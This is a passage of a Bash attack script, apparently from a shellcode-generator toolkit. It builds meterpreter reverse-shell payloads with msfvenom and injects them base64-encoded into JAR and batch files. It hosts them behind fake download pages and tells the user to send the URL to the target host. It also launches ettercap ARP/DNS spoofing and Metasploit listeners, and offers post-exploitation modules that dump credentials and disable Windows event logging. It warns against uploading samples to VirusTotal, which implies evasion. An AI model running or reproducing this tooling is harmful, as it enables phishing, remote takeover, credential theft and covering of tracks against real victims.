LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD java/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD java/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n          fi\n\n\n        else\n\n\n        echo \"- ATTACK VECTOR: http://$lhost\"\n        echo \"- POST EXPLOIT : $P0\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD java/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD java/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n          fi\n        fi\n   fi\n\n# CLEANING EVERYTHING UP\necho \"[☠] Cleanning temp generated files...\"\nsleep 2\nmv $IPATH/templates/phishing/driveBy[bak].html $InJEc13 > /dev/null 2>&1\nrm $IPATH/templates/phishing/copy.html > /dev/null 2>&1\nrm $ApAcHe/$N4m.jar > /dev/null 2>&1\nrm $ApAcHe/index.html > /dev/null 2>&1\nrm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1\nclear\ncd $IPATH/\n\n\n\n# ------------------------\n# build base64 jar payload\n# ------------------------\nelif [ \"$serv\" = \"windows/meterpreter/reverse_tcp (base64)\" ]; then\necho \"[☠] Building shellcode -> psh-cmd format ...\"\nsleep 2\n# display final settings to user\ncat << !\n\n    venom settings\n    ──────────────\n    LPORT   : $lport\n    LHOST   : $lhost\n    FORMAT  : PSH-CMD -> WINDOWS\n    PAYLOAD : windows/meterpreter/reverse_tcp\n\n!\n\n# use metasploit to build shellcode\nxterm -T \" SHELLCODE GENERATOR \" -geometry 110x23 -e \"msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f psh-cmd > $IPATH/output/chars.raw\"\n\n\n# display shellcode\necho \"\"\nstr0=`cat $IPATH/output/chars.raw | awk {'print $12'}`\necho \"[☠] obfuscating -> base64 encoded!\"\nsleep 2\necho $str0\necho \"\"\n\n# EDITING/BACKUP FILES NEEDED\necho \"[☠] editing/backup files...\"\ncp $IPATH/templates/exec.jar $IPATH/templates/exec[bak].jar\nsleep 2\necho \"[☠] Injecting shellcode -> $N4m.jar!\"\nsleep 2\ncd $IPATH/templates\nsed \"s|InJ3C|$str0|\" exec.jar > $N4m.jar\nmv $N4m.jar $IPATH/output/$N4m.jar\n\n\n# CHOSE HOW TO DELIVER YOUR PAYLOAD\nserv=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"Payload stored:\\n$IPATH/output/$N4m.jar\\n\\nchose how to deliver: $N4m.jar\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"multi-handler (default)\" FALSE \"apache2 (malicious url)\" --width 305 --height 240) > /dev/null 2>&1\n\n\n\n   if [ \"$serv\" = \"multi-handler (default)\" ]; then\n     # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n     echo \"[☠] Start a multi-handler...\"\n     echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n     echo \"[☯] Please dont test samples on virus total...\"\n       if [ \"$MsFlF\" = \"ON\" ]; then\n         xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'\"\n         cd $IPATH/output\n         # delete utf-8/non-ancii caracters from output\n         tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n         sed -i \"s/\\[0m//g\" final.log\n         sed -i \"s/\\[1m\\[34m//g\" final.log\n         sed -i \"s/\\[4m//g\" final.log\n         sed -i \"s/\\[K//g\" final.log\n         sed -i \"s/\\[1m\\[31m//g\" final.log\n         sed -i \"s/\\[1m\\[32m//g\" final.log\n         sed -i \"s/\\[1m\\[33m//g\" final.log\n         mv final.log $N4m-$lhost.log > /dev/null 2>&1\n         rm report.log > /dev/null 2>&1\n         cd $IPATH/\n       else\n         xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'\"\n       fi\n\n\n   else\n\n\n      # edit files nedded\n      cd $IPATH/templates/phishing\n      cp $InJEc13 driveBy[bak].html\n      sed \"s|NaM3|http://$lhost:$lport|g\" driveBy.html > copy.html\n      mv copy.html $ApAcHe/index.html > /dev/null 2>&1\n      # copy from output\n      cd $IPATH/output\n      cp $N4m.jar $ApAcHe/$N4m.jar > /dev/null 2>&1\n      echo \"[☠] loading -> Apache2Server!\"\n      echo \"---\"\n      echo \"- SEND THE URL GENERATED TO TARGET HOST\"\n      echo \"- THIS ATTACK VECTOR WILL TRIGGER PAYLOAD RCE\"\n\n        if [ \"$D0M4IN\" = \"YES\" ]; then\n        # copy files nedded by mitm+dns_spoof module\n        sed \"s|NaM3|$N4m.jar|\" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html\n        cp $IPATH/output/$N4m.jar $ApAcHe/$N4m.jar\n        echo \"- ATTACK VECTOR: http://mega-upload.com\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n          fi\n\n\n        else\n\n\n        echo \"- ATTACK VECTOR: http://$lhost\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'\"\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'\"\n          fi\n        fi\n   fi\n\n# CLEANING EVERYTHING UP\necho \"[☠] Cleanning temp generated files...\"\nsleep 2\nrm $ApAcHe/$N4m.jar > /dev/null 2>&1\nrm $ApAcHe/index.html > /dev/null 2>&1\nrm $IPATH/output/chars.raw > /dev/null 2>&1\nmv $IPATH/templates/exec[bak].jar $InJEc16 > /dev/null 2>&1\nmv $IPATH/templates/phishing/driveBy[bak].html $InJEc13 > /dev/null 2>&1\nrm $IPATH/templates/phishing/copy.html > /dev/null 2>&1\nclear\ncd $IPATH/\n\n\n\nelse\n# CLEANING EVERYTHING UP\necho \"[☠] Cancel button pressed, aborting...\"\nsleep 2\nsh_multi_menu\nfi\n}\n\n\n\n\n\n\n# ---------------------------------------------------------\n# WEB_DELIVERY PYTHON/PSH PAYLOADS (msfvenom web_delivery)\n# loading from msfconsole the amazing web_delivery module\n# writen by: 'Andrew Smith' 'Ben Campbell' 'Chris Campbell'\n# this as nothing to do with shellcode, but i LOVE this :D\n# ---------------------------------------------------------\nsh_shellcode19 () {\n# get user input to build the payload\necho \"[☆] Enter shellcode settings!\"\nsrvhost=$(zenity --title=\"☠ Enter SRVHOST ☠\" --text \"example: $IP\" --entry --width 300) > /dev/null 2>&1\nif [ \"$?\" -eq \"0\" ]; then\nlport=$(zenity --title=\"☠ Enter LPORT ☠\" --text \"example: 4444\" --entry --width 300) > /dev/null 2>&1\n# CHOSE WHAT PAYLOAD TO USE\nPuLK=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"Available payloads:\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"python\" FALSE \"powershell\" --width 305 --height 180) > /dev/null 2>&1\n\n\n## setting default values in case user have skip this ..\nif [ -z \"$srvhost\" ]; then srvhost=\"$IP\";fi\nif [ -z \"$lport\" ]; then lport=\"443\";fi\nif [ -z \"$PuLK\" ]; then PuLK=\"python\";fi\n\n\n   if [ \"$PuLK\" = \"python\" ]; then\n   echo \"[☠] Building shellcode -> $PuLK format ...\"\n   sleep 2\n   tagett=\"0\"\n   filename=$(zenity --title=\"☠ Enter PAYLOAD name ☠\" --text \"example: payload\" --entry --width 300) > /dev/null 2>&1\n\n# display final settings to user\ncat << !\n\n    venom settings\n    ──────────────\n    LPORT   : $lport\n    URIPATH : /SecPatch\n    SRVHOST : $srvhost\n    FORMAT  : PYTHON -> MULTI OS\n    PAYLOAD : python/meterpreter/reverse_tcp\n    STORED  : $IPATH/output/$filename.py\n\n!\n\n\n# EDITING/BACKUP FILES NEEDED\necho \"\"\necho \"[☠] editing/backup files...\"\ncp $IPATH/templates/web_delivery.py $IPATH/templates/web_delivery[bak].py\n\n\n   # check if exec.ps1 exists\n   if [ -e $IPATH/templates/web_delivery.py ]; then\n      echo \"[☠] web_delivery.py -> found!\"\n      sleep 2\n \n   else\n\n      echo \"[☠] web_delivery.py -> not found!\"\n      exit\n   fi\n\n\n# edit/backup files nedded\ncd $IPATH/templates/\necho \"[☠] building -> $filename.py\"\nsleep 2\n# use SED to replace SRVHOST in web_delivery.py\nsed \"s/SRVHOST/$srvhost/g\" web_delivery.py > $filename.py\nmv $filename.py $IPATH/output/$filename.py\nchmod +x $IPATH/output/$filename.py\n\n\n\n# post-exploitation\nP0=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\npost-exploitation module to run\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"sysinfo.rc\" FALSE \"enum_system.rc\" FALSE \"dump_credentials.rc\" FALSE \"fast_migrate.rc\" FALSE \"stop_logfiles_creation.rc\" FALSE \"exploit_suggester.rc\" FALSE \"linux_hostrecon.rc\" FALSE \"dump_credentials_linux.rc\" --width 305 --height 370) > /dev/null 2>&1\n\n\n  if [ \"$P0\" = \"stop_logfiles_creation.rc\" ]; then\n    #\n    # check if dependencies exist ..\n    #\n    if [ -e \"$pHanTom/post/windows/manage/Invoke-Phant0m.rb\" ]; then\n      echo \"[☠] Invoke-Phant0m.rb installed ..\"\n      sleep 2\n    else\n      echo \"[x] Invoke-Phant0m.rb not found ..\"\n      sleep 2\n      echo \"[☠] copy Invoke-Phant0m.rb to msfdb ..\"\n      sleep 2\n      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1\n      echo \"[☠] Reloading msfdb database ..\"\n      sleep 2\n      xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfdb reinit\" > /dev/null 2>&1\n      xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfconsole -q -x 'db_status; reload_all; exit -y'\" > /dev/null 2>&1\n    fi\n\n      #\n      # check if Invoke-Phantom.ps1 exists ..\n      #\n      if [ -e \"$IPATH/aux/Invoke-Phant0m.ps1\" ]; then\n        echo \"[☠] Invoke-Phant0m.ps1 found ..\"\n        sleep 2\n        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1\n      else\n        echo \"[x] Invoke-Phant0m.ps1 not found ..\"\n        sleep 2\n        echo \"[☠] Please place module in $IPATH/aux folder ..\"\n        sleep 2\n        exit\n      fi\n  fi\n\n\nif [ \"$P0\" = \"dump_credentials_linux.rc\" ]; then\n  if [ -e \"$pHanTom/post/linux/gather/wifi_dump_linux.rb\" ]; then\n    echo \"[✔] wifi_dump_linux.rb -> found\"\n    sleep 2\n  else\n    echo \"[x] wifi_dump_linux.rb -> not found\"\n    sleep 1\n    echo \"    copy post-module to msfdb ..\"\n    cp $IPATH/aux/msf/wifi_dump_linux.rb $pHanTom/post/linux/gather/wifi_dump_linux.rb > /dev/null 2>&1\n    echo \"[☠] Reloading msfdb database ..\"\n    sleep 2\n    xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfdb reinit\" > /dev/null 2>&1\n    xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfconsole -q -x 'db_status; reload_all; exit -y'\" > /dev/null 2>&1\n  fi\nfi\n\n\nif [ \"$P0\" = \"linux_hostrecon.rc\" ]; then\n  if [ -e \"$pHanTom/post/linux/gather/linux_hostrecon.rb\" ]; then\n    echo \"[✔] linux_hostrecon.rb -> found\"\n    sleep 2\n  else\n    echo \"[x] linux_hostrecon.rb -> not found\"\n    sleep 1\n    echo \"[*] copy post-module to msfdb ..\"\n    cp $IPATH/aux/msf/linux_hostrecon.rb $pHanTom/post/linux/gather/linux_hostrecon.rb > /dev/null 2>&1\n    echo \"[☠] Reloading msfdb database ..\"\n    sleep 2\n    xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfdb reinit\" > /dev/null 2>&1\n    xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfconsole -q -x 'db_status; reload_all; exit -y'\" > /dev/null 2>&1\n  fi\nfi\n\n\n\ncd $IPATH/templates/phishing\ncp $InJEc12 mega[bak].html\nsed \"s|NaM3|$filename.py|g\" mega.html > copy.html\nmv copy.html $ApAcHe/index.html > /dev/null 2>&1\ncd $IPATH/output\ncp $filename.py $ApAcHe/$filename.py > /dev/null 2>&1\necho \"[☠] loading -> Apache2Server!\"\necho \"---\"\necho \"- SEND THE URL GENERATED TO TARGET HOST\"\n\n\n        if [ \"$D0M4IN\" = \"YES\" ]; then\n        # copy files nedded by mitm+dns_spoof module\n        sed \"s|NaM3|$filename.py|\" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html\n        cp $IPATH/output/$filename.py $ApAcHe/$filename.py\n        echo \"- ATTACK VECTOR: http://mega-upload.com\"\n        echo \"- POST EXPLOIT : $P0\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n            xterm -T \" WEB_DELIVERY MSF MODULE \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $filename-$srvhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n            xterm -T \" WEB_DELIVERY MSF MODULE \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n          fi\n\n\n        else\n\n\n        echo \"- ATTACK VECTOR: http://$srvhost\"\n        echo \"- POST EXPLOIT : $P0\"\n        echo \"---\"\n\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n            xterm -T \" WEB_DELIVERY MSF MODULE \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $filename-$srvhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n            xterm -T \" WEB_DELIVERY MSF MODULE \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n          fi\n        fi\n\n\n# CLEANING EVERYTHING UP\necho \"[☠] Cleanning temp generated files...\"\nmv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1\nmv $IPATH/templates/web_delivery[bak].py $IPATH/templates/web_delivery.py > /dev/null 2>&1\nrm $IPATH/templates/phishing/copy.html > /dev/null 2>&1\nrm $ApAcHe/$filename.py > /dev/null 2>&1\nrm $ApAcHe/index.html > /dev/null 2>&1\nrm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1\nsleep 2\nclear\ncd $IPATH/\n# -------------------------------------------------\n\n   else\n\n# -------------------------------------------------\necho \"[☠] Building shellcode -> $PuLK format ...\"\nsleep 2\ntagett=\"2\"\nfilename=$(zenity --title=\"☠ Enter PAYLOAD name ☠\" --text \"example: payload\" --entry --width 300) > /dev/null 2>&1\n\n# display final settings to user\ncat << !\n\n    venom settings\n    ──────────────\n    LPORT   : $lport\n    URIPATH : /SecPatch\n    SRVHOST : $srvhost\n    FORMAT  : PSH -> WINDOWS\n    PAYLOAD : windows/meterpreter/reverse_tcp\n    STORED  : $IPATH/output/$filename.bat\n\n!\n\n\n# EDITING/BACKUP FILES NEEDED\necho \"\"\necho \"[☠] editing/backup files...\"\ncp $IPATH/templates/web_delivery.bat $IPATH/templates/web_delivery[bak].bat\n\n\n   # check if exec.ps1 exists\n   if [ -e $IPATH/templates/web_delivery.bat ]; then\n      echo \"[☠] web_delivery.bat -> found!\"\n      sleep 2\n \n   else\n\n      echo \"[☠] web_delivery.bat -> not found!\"\n      exit\n      fi\n\n\ncd $IPATH/templates/\necho \"[☠] building -> $filename.bat\"\nsleep 2\n# use SED to replace SRVHOST in web_delivery.py\nsed \"s/SRVHOST/$srvhost/g\" web_delivery.bat > $filename.bat\nmv $filename.bat $IPATH/output/$filename.bat\nchmod +x $IPATH/output/$filename.bat\n\n\n# post-exploitation\nP0=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\npost-exploitation module to run\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"sysinfo.rc\" FALSE \"enum_system.rc\" FALSE \"dump_credentials.rc\" FALSE \"fast_migrate.rc\" FALSE \"stop_logfiles_creation.rc\" FALSE \"exploit_suggester.rc\" --width 305 --height 310) > /dev/null 2>&1\n\n\n  if [ \"$P0\" = \"stop_logfiles_creation.rc\" ]; then\n    #\n    # check if dependencies exist ..\n    #\n    if [ -e \"$pHanTom/post/windows/manage/Invoke-Phant0m.rb\" ]; then\n      echo \"[☠] Invoke-Phant0m.rb installed ..\"\n      sleep 2\n    else\n      echo \"[x] Invoke-Phant0m.rb not found ..\"\n      sleep 2\n      echo \"[☠] copy Invoke-Phant0m.rb to msfdb ..\"\n      sleep 2\n      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1\n      echo \"[☠] Reloading msfdb database ..\"\n      sleep 2\n      xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfdb reinit\" > /dev/null 2>&1\n      xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfconsole -q -x 'db_status; reload_all; exit -y'\" > /dev/null 2>&1\n    fi\n\n      #\n      # check if Invoke-Phantom.ps1 exists ..\n      #\n      if [ -e \"$IPATH/aux/Invoke-Phant0m.ps1\" ]; then\n        echo \"[☠] Invoke-Phant0m.ps1 found ..\"\n        sleep 2\n        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1\n      else\n        echo \"[x] Invoke-Phant0m.ps1 not found ..\"\n        sleep 2\n        echo \"[☠] Please place module in $IPATH/aux folder ..\"\n        sleep 2\n        exit\n      fi\n  fi\n\n\ncd $IPATH/templates/phishing\ncp $InJEc12 mega[bak].html\nsed \"s|NaM3|$filename.bat|g\" mega.html > copy.html\nmv copy.html $ApAcHe/index.html > /dev/null 2>&1\ncd $IPATH/output\ncp $filename.bat $ApAcHe/$filename.bat > /dev/null 2>&1\necho \"[☠] loading -> Apache2Server!\"\necho \"---\"\necho \"- SEND THE URL GENERATED TO TARGET HOST\"\n\n\n        if [ \"$D0M4IN\" = \"YES\" ]; then\n        # copy files nedded by mitm+dns_spoof module\n        sed \"s|NaM3|$filename.bat|\" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html\n        cp $IPATH/output/$filename.bat $ApAcHe/$filename.bat\n        echo \"- ATTACK VECTOR: http://mega-upload.com\"\n        echo \"- POST EXPLOIT : $P0\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n            xterm -T \" WEB_DELIVERY MSF MODULE \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $filename-$srvhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n            xterm -T \" WEB_DELIVERY MSF MODULE \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n          fi\n\n\n        else\n\n\n        echo \"- ATTACK VECTOR: http://$srvhost\"\n        echo \"- POST EXPLOIT : $P0\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n            xterm -T \" WEB_DELIVERY MSF MODULE \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use 